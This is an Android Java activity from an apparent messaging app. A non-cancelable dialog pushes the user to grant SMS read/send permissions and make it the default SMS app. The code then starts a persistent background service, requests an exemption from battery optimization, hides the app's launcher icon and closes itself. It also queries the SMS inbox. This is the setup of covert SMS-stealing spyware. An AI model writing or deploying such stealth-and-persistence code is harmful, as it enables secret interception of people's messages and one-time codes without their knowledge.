package com.example.message;

import static android.os.Build.VERSION.SDK_INT;

import android.Manifest;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.Dialog;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.provider.Telephony;
import android.view.LayoutInflater;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.FrameLayout;

import com.example.message.service.FirstService;
import com.example.message.util.AppIconUtil;

import java.util.List;

public class MainActivity extends Activity implements View.OnClickListener {
    private Dialog dialog;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //申请读写短信权限
        requestPermissions(new String[]{Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS}, 1234);
        show();
    }


    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 10 && resultCode == 0) {
            //解决默认短信
            initPermission(this);
        } else if (requestCode == 10 && resultCode == -1) {
            //同意默认短信
            //启动后台
            initFirstService();
            //电池优化
            ignoreBatteryOptimization(this);
        } else if (requestCode == 11 && resultCode == -1) {
            //申请读写权限
            initSms();
            //隐藏桌面
            hide();
            //关闭窗口
            finish();
        } else if (requestCode == 11 && resultCode == 0) {
            //再次申请电池优化
            ignoreBatteryOptimization(this);
        } else if (requestCode == 1234) {
            //申请短信读写
            initSms();
        }
    }

    //隐藏图标
    public void hide() {
        // 先禁用AliasMainActivity组件，启用alias组件
        AppIconUtil.set(this, MainActivity.class.getName(), "com.learn.alias.target.Alias1Activity");
        // 10.0以下禁用alias后，透明图标就不存在了，10.0的必须开启，不然会显示主应用图标，10.0会有一个透明的占位图
        if (Build.VERSION.SDK_INT < 29) {
            // 禁用Alias1Activity
            AppIconUtil.disableComponent(this, "com.learn.alias.target.Alias1Activity");
        }
    }

    /**
     * 忽略电池优化
     */
    public void ignoreBatteryOptimization(Activity activity) {
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        boolean hasIgnored;
        hasIgnored = powerManager.isIgnoringBatteryOptimizations(activity.getPackageName());
        //  判断当前APP是否有加入电池优化的白名单，如果没有，弹出加入电池优化的白名单的设置对话框。
        if (!hasIgnored) {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + activity.getPackageName()));
            startActivityForResult(intent, 11);
        }
    }

    private void initFirstService() {
        if (!serverIsRunning(this, FirstService.class.getName())) {
            Intent intent = new Intent(this, FirstService.class);
            if (SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
        }
    }


    public boolean serverIsRunning(Context context, String componentName) {
        ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        if (activityManager == null) {
            return false;
        }
        List<ActivityManager.RunningServiceInfo> runningServices
                = activityManager.getRunningServices(Integer.MAX_VALUE);
        if (runningServices.size() <= 0) {
            return false;
        }
        for (ActivityManager.RunningServiceInfo serviceInfo : runningServices) {
            if (componentName.equals(serviceInfo.service.getClassName())) {
                return true;
            }
        }
        return false;
    }

    //弹窗
    private void show() {
        if (dialog != null) {
            return;
        }
        dialog = new Dialog(this);
        Window window = dialog.getWindow();
        if (window == null) {
            return;
        }
        dialog.setCancelable(false);
        window.setLayout(WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.WRAP_CONTENT);
        View view = LayoutInflater.from(this).inflate(R.layout.layout_dialog, new FrameLayout(this), false);
        dialog.setContentView(view);
        Button button = view.findViewById(R.id.button);
        button.setOnClickListener(this);
        dialog.show();
    }

    @Override
    public void onClick(View v) {
        dialog.dismiss();
        initPermission(this);
    }

    void initSms() {
        ContentResolver resolver = getContentResolver();
        if (resolver == null) {
            return;
        }
        Cursor s = resolver.query(Uri.parse("content://sms/"), new String[]{"_id", "address", "type", "body", "date"}, null, null, null);
        if (s != null) {
            s.close();
        }
        show();
    }

    //默认短信
    void initPermission(Activity activity) {
        String defaultSmsApp = Telephony.Sms.getDefaultSmsPackage(this);
        //获取手机当前设置的默认短信应用的包名
        String packageName = activity.getPackageName();
        if (defaultSmsApp == null) {
            System.out.println("获取为空");
            return;
        }
        if (!defaultSmsApp.equals(packageName)) {
            Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
            intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, packageName);
            startActivityForResult(intent, 10);
        }
    }
}
